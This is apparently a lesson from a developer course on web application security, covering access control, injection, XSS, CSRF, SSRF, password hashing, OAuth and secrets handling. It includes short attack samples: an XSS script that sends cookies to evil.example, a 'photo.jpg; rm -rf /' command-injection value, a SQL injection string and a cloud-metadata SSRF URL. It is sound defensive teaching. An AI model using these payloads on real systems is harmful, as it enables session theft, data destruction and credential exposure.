---
title: Application Security — Thinking Like an Attacker
summary: How real applications get broken into and how to stop it — the security mindset and threat modeling, the most common web vulnerabilities (broken access control, injection, XSS, CSRF, SSRF) with vulnerable and fixed code, storing passwords properly, sessions vs tokens, how "Sign in with Google" (OAuth and OpenID Connect) works step by step, and keeping secrets out of code.
---

## One changed number

> [!STORY] A customer logs into a telecom company's website and views their bill at `https://example-telecom.com/bills/88412`. Out of curiosity, they change the number to `88413` — and see a stranger's name, address and phone calls. Then `88414`. Then a script that tries every number. The site checked that the visitor was **logged in**, but never checked that the bill **belonged to them**. Variations of this exact mistake have exposed millions of records at real companies.

Security isn't a feature you add at the end. Attackers need **one** weakness; defenders have to think about all of them. The habit to build is simple: for every input and every action, ask **"what if someone sends something I didn't expect?"**

## The principles

- **Never trust input.** Anything from outside — form fields, URLs, headers, uploaded files, other services, even LLM output — may be crafted by an attacker.
- **Least privilege.** Every user, service and key gets only the access it needs.
- **Defense in depth.** Several independent layers, so one failure isn't a breach.
- **Secure by default.** The safe setting is the default; risk requires opting in.
- **Fail securely.** When something goes wrong, deny access and don't reveal internal details.

### Threat modeling: four questions

Before building, ask: **What are we building? What can go wrong? What will we do about it? Did we do a good job?** Draw how data flows between components and mark the **trust boundaries** — places where data crosses from less-trusted to more-trusted (browser → server, partner → your API). Every crossing needs validation and permission checks.

The **STRIDE** checklist helps you think of what can go wrong: **S**poofing (pretending to be someone), **T**ampering (changing data), **R**epudiation (denying you did something — so keep audit logs), **I**nformation disclosure (leaks), **D**enial of service, **E**levation of privilege (doing what you're not allowed to).

## The most common vulnerabilities

The **OWASP Top 10** is the industry's list of the most critical web application risks. Here are the ones every developer must know, with code.

### Broken access control (number 1)

The story above. The server checks **who you are** (authentication) but not **what you're allowed to do** (authorization).

```python
# Vulnerable: any logged-in user can read any bill
@app.get("/bills/{bill_id}")
def get_bill(bill_id: int, user = Depends(current_user)):
    return db.bills.get(bill_id)

# Fixed: check ownership on the server, every time
@app.get("/bills/{bill_id}")
def get_bill(bill_id: int, user = Depends(current_user)):
    bill = db.bills.get(bill_id)
    if bill is None or bill.account_id != user.account_id:
        raise HTTPException(404)     # 404 rather than 403: don't even confirm it exists
    return bill
```

- Check permissions **on the server** for every request — hiding a button in the UI is not security.
- **Deny by default**; put the checks in one central place rather than scattering them.
- In multi-customer systems, scope **every** database query to the current customer.

### Injection

Injection happens when data is mixed into a command and the system mistakes the data **for part of the command**.

> [!ANALOGY] A bank form says "Pay to: ____". Someone writes "Bob, and also transfer ₹1,00,000 to Mallory". A clerk who reads the field as instructions rather than a name has been injected. The fix is a form where the name field can only ever be a name.

```python
# SQL injection. If name is:  x' OR '1'='1   the query returns every user.
cur.execute(f"SELECT * FROM users WHERE name = '{name}'")        # NEVER build SQL with strings

# Fixed: a parameterized query. The database treats name purely as data.
cur.execute("SELECT * FROM users WHERE name = %s", (name,))

# Command injection. If filename is:  photo.jpg; rm -rf /
subprocess.run(f"convert {filename} out.png", shell=True)        # NEVER
subprocess.run(["convert", filename, "out.png"], check=True)      # a list of arguments, no shell
```

The same idea applies to NoSQL queries, templates, and **prompt injection** in AI apps (AI track, chapter 7).

### Cross-site scripting (XSS)

If your page displays user content without escaping it, an attacker can post a "comment" that's actually a script:

```html
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

Everyone who views the comment runs the attacker's code in **your** site — reading their data and acting as them.

Defenses: frameworks like Vue and React **escape output automatically** — don't bypass it (`v-html`, `dangerouslySetInnerHTML`) with untrusted content, or sanitize it first with a library like DOMPurify. Add a **Content Security Policy** header that blocks unexpected scripts, and mark session cookies `HttpOnly` so scripts can't read them.

### Cross-site request forgery (CSRF)

You're logged into your bank in one tab. In another tab, a malicious page silently submits a form to `bank.com/transfer`. Your browser helpfully attaches your bank cookie, and the bank sees a legitimate request from you.

Defenses: cookies with `SameSite=Lax` or `Strict` (browsers then won't send them on cross-site requests), anti-CSRF tokens in forms, and requiring re-authentication for sensitive actions.

### Server-side request forgery (SSRF)

Your app has a feature: "paste an image URL and we'll fetch it". An attacker pastes `http://169.254.169.254/latest/meta-data/` — the cloud's internal address that hands out server credentials. Your server, sitting inside the private network, fetches it and shows them the result. This is how the Capital One breach began (Cloud track, chapter 5).

Defenses: allow only the domains you expect, block private and internal addresses (after resolving the hostname), and use the cloud's hardened metadata service. *(This project's own article scraper blocks private addresses for exactly this reason.)*

### The rest of the list, briefly

- **Cryptographic failures:** sensitive data unencrypted, weak algorithms, home-made crypto. Use TLS everywhere and well-known libraries.
- **Security misconfiguration:** default passwords, public storage buckets, detailed error pages in production.
- **Vulnerable components:** old libraries with known holes. Use dependency scanners (Dependabot, Snyk) and update regularly.
- **Authentication failures:** no rate limit on login, weak password rules, sessions that never expire.
- **Integrity failures:** running unverified code or updates (the xz backdoor, Cloud track, chapter 6).
- **Missing logging and monitoring:** a breach nobody notices for months.

## Storing passwords

Never store passwords as plain text — or even as a simple hash like SHA-256. If the database leaks, attackers can try billions of guesses per second against fast hashes.

Use a **slow, salted password-hashing function**: **Argon2id**, bcrypt or scrypt.

- **Salt:** a random value stored with each password, so two users with the same password get different hashes, and precomputed tables of common passwords are useless.
- **Slow on purpose:** taking ~100 ms per check is unnoticeable for one login but makes billions of guesses impractical.

Also: check new passwords against lists of known breached passwords, rate-limit login attempts, and offer **multi-factor authentication** — ideally **passkeys** or security keys, which can't be phished the way SMS codes can.

## Sessions vs tokens

After login, how does the server remember you?

- **Session cookie:** the server stores a session record and gives the browser a random ID in a cookie (`HttpOnly`, `Secure`, `SameSite`). Easy to revoke — delete the record.
- **JWT (JSON Web Token):** a signed token containing your identity and permissions; any server can verify it without a database lookup. Great between services, but hard to revoke before it expires — so keep them short-lived (minutes) and pair them with refresh tokens.

For ordinary web apps, session cookies are simpler and safer. Never store tokens in `localStorage`, where any XSS can read them.

## "Sign in with Google": OAuth 2.0 and OpenID Connect

> [!ANALOGY] A hotel key card. At reception (Google), you prove who you are once. Reception gives you a card that opens **only** your room and the gym, **only** until checkout. You never hand the hotel's master key — or your passport — to the gym. OAuth gives an app a limited, temporary "key card" to your data without ever giving it your password.

- **OAuth 2.0** is about **permission**: "this app may read my calendar".
- **OpenID Connect (OIDC)** adds **identity** on top: "this person is asha@example.com".

The recommended flow for web and mobile apps, step by step:

::widget Sequence {"title":"Signing in with an identity provider (OAuth authorization code flow with PKCE)","what":"The messages exchanged when a user signs in to your app with an account like Google. Each arrow is one message; the user's password only ever goes to the identity provider.","steps":["Step through each message.","Notice that the user types their password only at the identity provider, never in your app.","Find the step where the one-time code is exchanged for tokens, and what stops an attacker who steals that code."],"actors":["User's browser","Your app","Identity provider","Calendar API"],"msgs":[[1,1,"make a secret + its hash (PKCE)","Your app creates a random secret and keeps it. It will send only the secret's hash now, and the secret itself later — so a stolen one-time code is useless to anyone else."],[1,0,"redirect to the identity provider","With which app is asking, what access it wants (e.g. read calendar), a random 'state' value and the secret's hash."],[0,2,"user signs in and approves","The password is typed only here, at the identity provider. The user sees exactly what the app is asking for."],[2,0,"redirect back with a one-time code","The code is short-lived and can be used once."],[0,1,"deliver the code to your app","Your app checks that 'state' matches what it sent, preventing forged callbacks."],[1,2,"exchange the code + the secret for tokens","The provider checks the secret matches the hash from step 1."],[2,1,"access token and ID token","The access token is the 'key card' for APIs. The ID token says who the user is."],[1,3,"call the API with the access token","The API checks the token's signature, expiry, audience and permissions before answering."]]}

## Keeping secrets out of code

API keys, database passwords and signing keys must **never** be committed to Git — bots scan public repositories for leaked keys within minutes.

- Store them in a **secrets manager** (AWS Secrets Manager, Google Secret Manager, HashiCorp Vault) and inject them at runtime.
- Prefer **short-lived credentials** from roles over long-lived keys.
- Run secret scanners in CI and as a pre-commit hook.
- If a secret leaks, **rotate it immediately** — deleting the commit isn't enough; it's in the history and in clones.

## Building security into the process

- Threat model new features; include security requirements in design reviews.
- Automated checks in CI: dependency scanning, static analysis (SAST), secret scanning.
- Code review with security in mind, especially around permissions and input handling.
- Penetration tests and a bug bounty program for mature products.
- An incident response plan — know what you'll do **before** a breach.

> [!RECAP]
> - **Never trust input**; apply least privilege, defense in depth and secure defaults; **threat model** with STRIDE.
> - **Broken access control**: check ownership on the server for every request.
> - **Injection**: parameterized queries and argument lists — never build commands from strings.
> - **XSS**: let the framework escape output, sanitize HTML, use CSP and HttpOnly cookies. **CSRF**: SameSite cookies and tokens. **SSRF**: allowlists and blocking internal addresses.
> - Store passwords with **Argon2id/bcrypt** + salt; prefer passkeys/MFA; session cookies for web apps, short-lived JWTs between services.
> - **OAuth** grants limited access; **OIDC** adds identity; use the authorization code flow with **PKCE**.
> - Keep secrets in a **secrets manager**; rotate on leak.

> [!INTERVIEW] Expect "how would you secure this API?", explaining SQL injection, XSS and CSRF with their fixes, how to store passwords, sessions vs JWTs, and how OAuth login works. In system design, mention authentication, authorization, rate limiting, encryption and audit logs without being prompted.

::quiz {"q":"A user changes /orders/1001 to /orders/1002 and sees someone else's order. What's the vulnerability?","options":["XSS","Broken access control (IDOR) — the server doesn't check ownership","CSRF","SQL injection"],"answer":1,"explain":"Authorize every object access on the server."}

::quiz {"q":"What's the correct defense against SQL injection?","options":["Escaping quotes by hand","Parameterized queries, so input is always treated as data","Hiding error messages","Using POST instead of GET"],"answer":1,"explain":"The query structure and the data travel separately."}

::quiz {"q":"Why is SHA-256 alone a poor way to store passwords?","options":["It's not secure","It's too fast — attackers can try billions of guesses per second; use a slow, salted function like Argon2id","It produces long hashes","It can't be salted"],"answer":1,"explain":"Password hashing must be deliberately slow and salted."}
